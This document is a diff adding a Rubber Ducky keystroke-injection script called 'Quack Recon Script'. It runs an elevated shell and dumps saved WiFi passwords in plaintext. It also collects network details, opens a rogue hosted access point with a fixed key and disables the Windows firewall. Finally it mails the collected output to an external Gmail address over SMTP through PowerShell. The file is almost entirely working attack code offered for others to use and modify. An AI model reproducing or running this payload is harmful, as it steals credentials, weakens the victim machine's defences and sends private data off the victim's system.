@@ -1,0 +1,103 @@
+# Quack Recon Script
+# Author: @portslug
+
+# This Quack Recon Script (beta) has a lot of features for doing recon with the Ruber Ducky; that is packed into a single script. Below is some of the main functions
+# Displays the current WiFi Connections credentials by exploiting the * character in Command Prompt, which acts as "everything". * in netsh wlan show profile name=* key=clear Thus, regardless of the access points name, wifi will display the key(password) in plaintext output
+# Display ipconfig /all  and netstat -ano
+# Creates an access point with the credentials ssid=verizon key=password then drops the windows firewall
+# By "exploiting"the copy command prompts output function, and sending it via SMTP through Powershell. The Notepad file will copy all of command Prompts output that is located in the windows temp folder (C:\Windows\Temp\Settings.txt).
+
+# This script is a little buggy/sluggish still and is in the testing phase. Please feel free to modiy it's functionality to your liking
+
+# Script Starts below
+
+DEFAULT_DELAY 1000 
+CTRL ESCAPE 
+GUI r 
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER 
+ALT y 
+STRING netsh wlan show profile name=* key=clear 
+ENTER 
+STRING ipconfig /all 
+ENTER 
+STRING netstat -ano
+ENTER 
+STRING netsh wlan set hostednetwork mode=allow ssid=verizon key=password
+ENTER 
+STRING netsh firewall set opmode disable 
+ENTER 
+ALT SPACE 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+ENTER 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+ENTER 
+ENTER 
+STRING exit 
+ENTER 
+GUI r 
+STRING notepad 
+ENTER 
+CTRL v 
+ALT SPACE 
+RIGHTARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+ENTER 
+STRING C:\Windows\Temp\Settings.txt 
+ENTER 
+GUI r 
+CTRL ESCAPE 
+DELAY 500 
+GUI r 
+DELAY 500 
+SHIFT 2 
+DELAY 500 
+CTRL a 
+DELAY 500 
+CTRL c 
+DELAY 500 
+STRING powershell 
+ENTER 
+DELAY 1000 
+STRING $SMTPServer = 'smtp.gmail.com' 
+ENTER 
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+ENTER 
+STRING $SMTPInfo.EnableSsl = $true 
+ENTER 
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail 
+CTRL v 
+STRING gmail.com', 'Password Here'); 
+ENTER 
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage 
+ENTER 
+STRING $ReportEmail.From = 'youremail 
+CTRL v 
+STRING gmail.com' 
+ENTER 
+STRING $ReportEmail.To.Add('toemail 
+CTRL v 
+STRING gmail.com') 
+ENTER 
+STRING $ReportEmail.Subject = 'Quack Recon Report' 
+ENTER 
+STRING $ReportEmail.Body = 'Attached is your Quack Recon Report.' 
+ENTER 
+STRING $ReportEmail.Attachments.Add('C:\Windows\Temp\Settings.txt') 
+ENTER 
+STRING $SMTPInfo.Send($ReportEmail) 
+ENTER 
+DELAY 3000 
+STRING exit 
+ENTER 
+
+# Script Ends above
